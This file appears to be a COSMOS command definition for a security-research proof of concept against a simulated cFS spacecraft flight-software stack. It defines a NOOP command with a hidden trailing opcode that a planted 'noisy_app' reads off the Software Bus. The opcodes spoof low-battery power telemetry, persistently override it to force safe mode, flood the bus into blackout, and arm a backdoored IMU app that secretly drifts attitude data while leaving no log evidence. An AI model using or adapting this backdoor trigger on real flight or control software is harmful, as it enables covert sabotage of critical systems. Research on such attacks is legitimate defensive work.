# =============================================================================
# DTU PIGGYBACK PoC - covert-opcode command (research fixture)
# =============================================================================
# A CI_LAB NOOP (function code 0) carrying ONE extra trailing byte (OPCODE) in
# the otherwise-unused payload tail. Sent manually from the COSMOS Command
# Sender to nos-fsw:5012 over the DEBUG interface, exactly like CI_DEBUG_NOOP_CC.
#
# On arrival:
#   - CI_LAB (the legitimate target of 0x18E0) calls CFE_MSG_VerifyCmdLength,
#     sees length 9 != expected 8, REJECTS the NOOP and bumps its
#     CommandErrorCounter (the endpoint defense, visible in CI_LAB HK / EVS).
#   - noisy_app, co-subscribed to 0x18E0, reads the trailing OPCODE byte off the
#     Software Bus and dispatches a scenario - the endpoint length check does
#     not stop the bus sniffer.
#
# A normal CI_DEBUG_NOOP_CC (no OPCODE, length 8) is ignored by noisy_app, so
# legitimate NOOPs are unaffected. To remove the PoC, delete this file.
#
# CCSDS_LENGTH is the CCSDS data-length field = (octets after the 6-byte primary
# header) - 1. NOOP tail here = FC(1) + CHECKSUM(1) + OPCODE(1) = 3 -> LENGTH 2.
# =============================================================================

COMMAND CFS CI_DEBUG_PIGGYBACK_NOOP_CC BIG_ENDIAN "Piggyback NOOP: CI_LAB NOOP with a covert trailing opcode byte (DTU PoC)"
  APPEND_PARAMETER CCSDS_STREAMID      16 UINT MIN_UINT16 MAX_UINT16 0x18E0 "CCSDS Packet Identification (CI_LAB_CMD_MID)"
  APPEND_PARAMETER CCSDS_SEQUENCE      16 UINT MIN_UINT16 MAX_UINT16 0xC000 "CCSDS Packet Sequence Control"
  APPEND_PARAMETER CCSDS_LENGTH        16 UINT MIN_UINT16 MAX_UINT16 2      "CCSDS Packet Data Length (2 = NOOP tail + 1 opcode byte)"
  APPEND_PARAMETER CCSDS_FC            8  UINT MIN_UINT8  MAX_UINT8  0      "CCSDS Command Function Code (CI_LAB_NOOP_CC = 0)"
  APPEND_PARAMETER CCSDS_CHECKSUM      8  UINT MIN_UINT8  MAX_UINT8  0      "CCSDS Command Checksum (unverified by CI_LAB)"
  APPEND_PARAMETER OPCODE              8  UINT MIN_UINT8  MAX_UINT8  0      "Piggybacked covert opcode read by noisy_app"
    STATE DORMANT      0x00
    STATE EPS_SPOOF    0x02
    STATE SB_BURST     0x04
    STATE EPS_OVERRIDE 0x06
    STATE SB_FLOOD     0x08
    STATE IMU_BIAS     0x0A
# OPCODE notes:
#   DORMANT      stealth; also CLEARS a running EPS_OVERRIDE.
#   EPS_SPOOF    forge ONE low-battery EPS HK (one-shot; needs re-arm to fire SAFE).
#   SB_BURST     bounded 64-packet pool/pipe stress (sim stays alive).
#   EPS_OVERRIDE PERSISTENT: shadow every real EPS HK so the spoof always wins LC.
#   SB_FLOOD     DESTRUCTIVE: locks the whole SB pool -> total blackout, needs restart.
#   IMU_BIAS     COVERT CHANNEL: noisy_app drops an IMU bias spec file on /ram
#                (NOT the Software Bus). The backdoored generic_imu app latches
#                it and slow-drifts its own gyro/accel telemetry (0x26), which
#                feeds ADCS attitude determination. The arming opcode is visible
#                (this command + the CI_LAB length error), but the channel and
#                the IMU bias produce ZERO SB/EVS evidence. See
#                docs/security/covert-channel-imu-design.md.
